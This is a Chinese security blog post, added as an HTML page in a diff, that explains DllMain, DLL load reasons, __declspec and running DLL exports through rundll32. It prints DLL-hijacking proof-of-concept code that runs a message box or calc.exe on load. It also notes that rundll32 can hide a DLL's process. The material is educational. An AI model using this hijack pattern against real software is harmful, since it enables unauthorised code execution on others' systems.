@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>DllMain与rundll32详解 « 倾旋的博客</title>
+  <meta name="description" content="0x00 DllMain对于动态链接库，DllMain是一个可选的入口函数。程序调用DLL中的导出函数的流程  程序调用Windows API LoadLibrary  操作系统寻找LoadLibrary所加载的DLL文件  操作系统将DLL文件加载至目标程序进程的内存空间  程序自动调用DllMain函数  程...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2019-10-02/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">DllMain与rundll32详解</h1>
+    <p class="post-meta">Oct 2, 2019</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="0x00-dllmain">0x00 DllMain</h2>
+
+<p>对于动态链接库，DllMain是一个<strong>可选的</strong>入口函数。</p>
+
+<h3 id="程序调用dll中的导出函数的流程">程序调用DLL中的导出函数的流程</h3>
+
+<ul>
+  <li>程序调用Windows API <code class="language-plaintext highlighter-rouge">LoadLibrary</code>
+</li>
+  <li>操作系统寻找LoadLibrary所加载的DLL文件</li>
+  <li>操作系统将DLL文件加载至目标程序进程的内存空间</li>
+  <li>程序自动调用<code class="language-plaintext highlighter-rouge">DllMain</code>函数</li>
+  <li>程序调用DLL中导出函数</li>
+</ul>
+
+<p><strong>如果DLL被多次<code class="language-plaintext highlighter-rouge">LoadLibrary</code>，那么<code class="language-plaintext highlighter-rouge">DllMain</code>只执行一次，引用基数+1。</strong></p>
+
+<h3 id="dllmain的原型">DllMain的原型</h3>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span>
+  <span class="n">_In_</span> <span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="c1">// 指向自身的句柄</span>
+  <span class="n">_In_</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="c1">// 调用原因</span>
+  <span class="n">_In_</span> <span class="n">LPVOID</span> <span class="n">lpvReserved</span> <span class="c1">// 隐式加载和显式加载</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="0x01-dllmain调用原因">0x01 DllMain调用原因</h2>
+
+<p>其中<code class="language-plaintext highlighter-rouge">fdwReason</code>用来表示Dll被调用的状态，一共分为四种：</p>
+
+<ul>
+  <li>DLL_PROCESS_ATTACH 被进程加载</li>
+  <li>DLL_PROCESS_DETACH 被进程释放</li>
+  <li>DLL_THREAD_ATTACH  被线程加载</li>
+  <li>DLL_THREAD_DETACH  被线程释放</li>
+</ul>
+
+<p>在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">ul_reason_for_call</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="err">　</span><span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+<span class="err">　</span><span class="p">{</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">process attach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">thread attach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">thread detach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　　</span><span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+<span class="err">　　　</span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">process detach of dll"</span><span class="p">);</span>
+<span class="err">　　　</span><span class="k">break</span><span class="p">;</span>
+<span class="err">　</span><span class="p">}</span>
+<span class="err">　</span><span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="0x02-那些用于测试dll劫持的dllmain-poc">0x02 那些用于测试DLL劫持的DllMain POC</h2>
+
+<ul>
+  <li>https://cxsecurity.com/issue/WLB-2018090232</li>
+  <li>https://cxsecurity.com/issue/WLB-2015010114</li>
+</ul>
+
+<p>在测试很多DLL劫持的漏洞时，都喜欢用DllMain，是因为DllMain被进程加载或者释放都会自动调用运行。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
+</span>
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span>
+            <span class="n">HANDLE</span>    <span class="n">hinstDLL</span><span class="p">,</span>
+            <span class="n">DWORD</span>     <span class="n">fdwReason</span><span class="p">,</span>
+            <span class="n">LPVOID</span>    <span class="n">lpvReserved</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">fdwReason</span><span class="p">)</span>
+  <span class="p">{</span>
+  <span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+    <span class="n">owned</span><span class="p">();</span>
+  <span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+        <span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+  <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">owned</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">MessageBox</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"iExplorer DLL Hijacked\Hadji Samir"</span><span class="p">,</span> <span class="s">"POC"</span><span class="p">,</span> <span class="n">MB_OK</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cp">#include &lt;windows.h&gt;
+#define DLLIMPORT __declspec (dllexport)
+</span> 
+<span class="n">DLLIMPORT</span> <span class="kt">void</span> <span class="nf">HrCreateConverter</span><span class="p">()</span> <span class="p">{</span> <span class="n">evil</span><span class="p">();</span> <span class="p">}</span>
+ 
+<span class="kt">int</span> <span class="nf">evil</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">WinExec</span><span class="p">(</span><span class="s">"calc"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="0x03-__declspec">0x03 __declspec</h2>
+
+<p><code class="language-plaintext highlighter-rouge">__declspec</code>是Microsoft VC中专用的关键字，它配合着一些属性可以对标准C/C++进行扩充。<code class="language-plaintext highlighter-rouge">__declspec</code>关键字应该出现在声明的前面。</p>
+
+<p><code class="language-plaintext highlighter-rouge">__declspec(dllexport)</code>用于Windows中的动态库中，声明导出函数、类、对象等供外面调用，省略给出.def文件。即将函数、类等声明为导出函数，供其它程序调用，作为动态库的对外接口函数、类等。</p>
+
+<p><code class="language-plaintext highlighter-rouge">__declspec(dllimport)</code>用于Windows中，从别的动态库中声明导入函数、类、对象等供本动态库或exe文件使用。当你需要使用DLL中的函数时，往往不需要显示地导入函数，编译器可自动完成。</p>
+
+<h2 id="0x04-关于rundll32">0x04 关于rundll32</h2>
+
+<p>Rundll32.exe是什么？顾名思意，”执行32位的DLL文件”。它的作用是执行DLL文件中的内部函数，这样在进程当中，只会有Rundll32.exe，而不会有DLL后门的进程，这样，就实现了进程上的隐藏。</p>
+
+<p>– 百度百科</p>
+
+<p>经过如上解释，可以总结为，rundll32能够运行一个32位的dll文件，并且在进程列表中只能看到rundll32.exe，但是遍历rundll32.exe的模块列表可以看到进程加载的dll。</p>
+
+<hr>
+
+<p><strong>并不是所有的dll都能够被rundll32运行。</strong> 为何这么说，因为rundll32只支持特定的函数声明方式，并且该函数必须在dll文件的导出表中。关于导出表的知识可以阅读 - 《Windows PE权威指南》 👍</p>
+
+<p>rundll32.exe支持的函数原型如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VOID CALLBACK FunctionName (HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow);
+</code></pre></div></div>
+
+<p>通过原型可以发现，与Windows平台下的<code class="language-plaintext highlighter-rouge">WinMain</code>一模一样，可以理解为rundll32调用的函数就是一段代码的入口函数。</p>
+
+<p>下面来写一个支持rundll32运行的dll：</p>
+
+<ol>
+  <li>使用visual studio新建一个dll工程，并声明函数：<code class="language-plaintext highlighter-rouge">rundll</code>
+</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;Windows.h&gt;
+
+
+extern "C" __declspec(dllexport) void rundll(HWND hwnd,HINSTANCE hinst,LPTSTR lpCmdLine,INT nCmdShow){
+
+	MessageBox(NULL,TEXT("-Test-"),TEXT("Rundll32"),MB_OK);
+
+}
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/00fc4fb53fc6fe2066e0273a84b03e28.png" alt="2019-10-02-19-58-36"></p>
+
+<ol>
+  <li>使用rundll32运行dll</li>
+</ol>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1dfbb642309ac2a2a741c529751ce50c.png" alt="2019-10-02-20-00-18"></p>
+
+<p>通过进程列表查看：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7c1e7c60d47a3d76d7f47a40c1354d68.png" alt="2019-10-02-20-00-54"></p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f7afbb1ba62e1a1280cb3d1df141ad21.png" alt="2019-10-02-20-04-38"></p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">wmic process get commandline</code>也可以获得命令行详情：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b29994c93ed7dd8514360df92fbca405.png" alt="2019-10-02-20-02-49"></p>
+
+<p>还有一种方式是获得该进程加载的模块，这是最精确的了；但windows 7不能直接看到，需要借助工具。（win10可以通过任务查看器看到..）</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/55c8bd2002161bf855fffea28e31c05d.png" alt="2019-10-02-20-08-24"></p>
+
+<p><strong>这个dll是没有DllMain也能够正常运行的，并不是所有的dll都有DllMain这个函数</strong></p>
+
+<p>我经过实验后发现，一个dll有没有DllMain完全取决于当前这个dll对于功能的需求，如果对装载方式的状态没有特定的要求，完全可以省去编写DllMain，因为DllMain不是一个导出函数，永远是一个由系统被动调用的函数。</p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
